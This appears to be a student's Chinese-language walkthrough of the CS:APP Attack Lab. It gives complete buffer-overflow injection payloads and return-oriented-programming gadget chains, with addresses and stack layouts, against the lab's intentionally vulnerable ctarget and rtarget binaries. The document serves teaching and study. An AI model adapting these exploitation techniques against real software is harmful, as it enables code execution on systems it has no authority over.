# Part I: Code Injection Attacks
由于Lab程序编译平台比较老，运行时会出现segment fault。可以自己链接一个printf函数来解决这个问题。详细见[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)  
运行时使用如下命令
```
$ LD_PRELOAD=./printf.so ./ctarget -q
```
或在GDB中使用
```
(gdb) set environment LD_PRELOAD=./printf.so
```

## Phase 1
阅读`getbuf`函数反汇编代码可以发现调用时分配了`0x28`大小的栈空间，该空间包括了`BUFFER_SIZE`指定的空间大小和编译器预留的空间。再往上`0x8`字节即为返回地址。输入字符串覆盖该地址即可。
```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
```
查找`touch1`函数的地址为`0x4017c0`, 小端表示并扩展到`0x8`字节得到
```
c0 17 40 00 00 00 00 00
```
前面随便填充`0x28`字节的字符即可

## Phase 2
使用gdb查看运行时栈地址, 注意到调用`getbuf`后栈地址维持`0x5561dca0`不变, 考虑直接写入指令进行攻击
注意此时栈指针`%rsp`经过经过一次`ret`后值为`0x5561dca8`, 顶部 8 bytes写入`touch2`地址进行`ret`
```
0x5561dca8 ec 17 40 00 00 00 00 00
```
继续往上8 bytes用于存储需要传入的`cookie`, 起始地址距栈顶`0x8`
```
0x5561dcb0 fa 97 b9 59 00 00 00 00
```
攻击执行的汇编指令如下
```
mov 0x8(%rsp),%rdi
ret
```
参考已有的反汇编代码可以写为16进制指令
```
mov 0x8(%rsp),%rdi  48 8b 7c 24 08
ret                 c3
```
指令共6 bytes. 反推从`getbuf`返回时的执行指令地址为`0x5561dca8 + 0x8 + 0x8 = 0x5561dcb8`
整理为写入后的栈帧
```
0x5561dcbd c3 
0x5561dcb8 48 8b 7c 24 08
0x5561dcb0 fa 97 b9 59 00 00 00 00
0x5561dca8 ec 17 40 00 00 00 00 00
0x5561dca0 b8 dc 61 55 00 00 00 00 
```

## Phase 3
方法类似Phase 2, 区别在于写入的值和栈上数据的位置布局. 首先考虑第一次`ret`跳转后, 顶部写入`touch3`地址准备进行下一次`ret`
```
0x5561dca8 fa 18 40 00 00 00 00 00
```
写入`cookie`的十六进制表示字符串(包含一个`\0`终止符)
```
0x5561dcb8 00
0x5561dcb0 35 39 62 39 39 37 66 61
```
此后写入执行代码
```
lea 0x8(%rsp),%rdi
ret
```
参考已有的反汇编代码改写为二进制指令
```
lea 0x8(%rsp),%rdi   48 8d 7c 24 08
ret                  c3
```
故首次写入的ret返回地址应为`0x5561dca8 + 0x8 + 0x8 + 0x1 = 0x5561dcb9`. 整理写入后的栈帧
```
0x5561dcbe c3
0x5561dcb9 48 8d 7c 24 08
0x5561dcb8 00
0x5561dcb0 35 39 62 39 39 37 66 61
0x5561dca8 fa 18 40 00 00 00 00 00
0x5561dca0 b9 dc 61 55 00 00 00 00 
```

## Phase 4
由于可以在Gadget中使用`pop`指令将数据从栈保存至寄存器
搜索`pop %rdi`的二进制指令`5f`没有搜索到相关片段, 可以使用不直接存入`%rdi`, 而是先`pop`到某一寄存器后通过`movq`指令存入`%rdi`.  
依此搜索`pop`各个寄存器的二进制指令, `pop %rax`对应的`58`指令在代码段出现
```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	ret    

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret    
```
排除无法解析为指令的`92`, 剩下两个函数均可用作Gadget.
下一步寻找形如`movq %rax,%rdi`的转移指令, 找到
```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret    
```
执行转移后即`ret`. 使用这两个函数完成ROP攻击.  整理写入数据
```
ec 17 40 00 00 00 00 00 <- touch2入口地址
a2 19 40 00 00 00 00 00 <- addval_273中的movq地址
fa 97 b9 59 00 00 00 00 <- cookie
ab 19 40 00 00 00 00 00 <- addval_219中的pop指令地址
```

## Phase 5
首先考虑`cookie`字符串的布局.  假设`cookie`按照下列方式布局
```
fa 18 40 00 00 00 00 00 <- touch3入口地址
...                     <- 多次ret
00 00 00 00 00 00 00 00 <- 填充0
35 39 62 39 39 37 66 61 <- cookie字符串
...                     <- 多次ret
```
此时发现如果调用`touch3`时想将`%rdi`设置为栈上字符串的地址, 必须在栈指针指向`cookie`的那次调用中使用`mov`指令保存栈指针后又一次用`pop`修改栈指针使得下次能够返回到代码段继续执行.  
以此为条件搜索所有`pop`指令, 未找到满足该条件的Gadget, 因此可以判断栈上内存布局应当为
```
00 
35 39 62 39 39 37 66 61 <- cookie字符串
fa 18 40 00 00 00 00 00 <- touch3入口地址
...                     <- 多次ret
```
在这样的布局下, 必须使用`lea`指令对栈指针进行偏移, 据此搜索得到
```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	ret   
```
函数可用于此目的. 于是向前推之需要将栈指针(或经多次转存)保存至`%rdi`或`%rsi`, 再使用`pop`指令保存偏移的常量至另一寄存器，此后调用`add_xy`执行偏移, 再将数据从`%rax`转移至`%rdi`.  
搜索`mov %rsp,%...`指令找到
```
0000000000401aab <setval_350>:
  401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  401ab1:	c3                   	ret    
```
该Gadget进行`%rsp -> %rax`. 继续搜索得到
```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret    
```
该Gadget进行`%rax -> %rdi`. 继续搜索得到
```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	ret    
```
该Gadget进行`pop %rax`. 继续搜索得到
```
00000000004019db <getval_481>:
  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
  4019e0:	c3                   	ret   
```
该Gadget进行`%eax -> %edx`. 继续搜索得到
```
0000000000401a68 <getval_311>:
  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax
  401a6d:	c3                   	ret    
```
该Gadget进行`%edx -> %ecx`. 继续搜索得到
```
0000000000401a11 <addval_436>:
  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
  401a17:	c3                   	ret    
```
该Gadget进行`%ecx -> %esi`. 至此所有Gadget备齐, 整理栈帧
```
00
35 39 62 39 39 37 66 61     # cookie字符串
fa 18 40 00 00 00 00 00     # touch3入口地址
c5 19 40 00 00 00 00 00     # %rax->rdi
d6 19 40 00 00 00 00 00     # add_xy
13 1a 40 00 00 00 00 00     # %ecx->esi
69 1a 40 00 00 00 00 00     # %edx->ecx
dd 19 40 00 00 00 00 00     # %eax->%edx
48 00 00 00 00 00 00 00     # cookie 字符串偏移 9 * 0x8 = 0x48
ab 19 40 00 00 00 00 00     # pop %rax
c5 19 40 00 00 00 00 00     # %rax->rdi     <- 保存的栈指针指向此处
ad 1a 40 00 00 00 00 00     # %rsp->%rax
```